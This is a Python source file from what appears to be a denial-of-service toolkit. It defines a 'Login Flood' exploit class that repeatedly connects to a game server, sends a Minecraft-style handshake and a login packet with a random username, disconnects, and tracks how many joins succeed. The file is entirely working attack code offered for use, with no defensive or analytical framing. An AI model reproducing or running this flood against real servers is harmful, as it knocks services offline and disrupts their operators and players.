import socket
import struct
import random
import string
import time
from .base import Exploit
from ..protocol_utils import pack_varint, pack_string, pack_packet

class LoginFloodExploit(Exploit):
    """
    A classic login flood attack. It attempts to connect, handshake, and log in
    with a random username, then disconnects. This exhausts server resources
    handling the login process.
    """
    id = "login_flood"
    name = "Login Flood"
    description = "Floods the server with fake login attempts."
    category = "Denial of Service"

    def run(self):
        """The main worker loop for the login flood."""
        while time.time() < self.stop_time:
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.host, self.port))

                # Handshake
                handshake_data = pack_varint(758) + pack_string(self.host) + struct.pack(">H", self.port) + pack_varint(2)
                sock.sendall(pack_packet(0x00, handshake_data))

                # Login Start
                login_data = pack_string(username)
                sock.sendall(pack_packet(0x00, login_data))
                self.stats.increment('packets_sent', 2)

                # Wait for a response (e.g., encryption request or disconnect)
                sock.settimeout(0.5)
                sock.recv(1024) # We don't care what it is, just that we got something
                self.stats.increment('joins_succeeded')
            
            except (socket.timeout, ConnectionResetError):
                # This is an expected outcome for a successful join, as the server might kick us.
                self.stats.increment('joins_succeeded')
            except Exception:
                self.stats.increment('joins_failed')
            finally:
                if sock:
                    sock.close()
            
            time.sleep(0.05) # Small delay to avoid overwhelming the local network
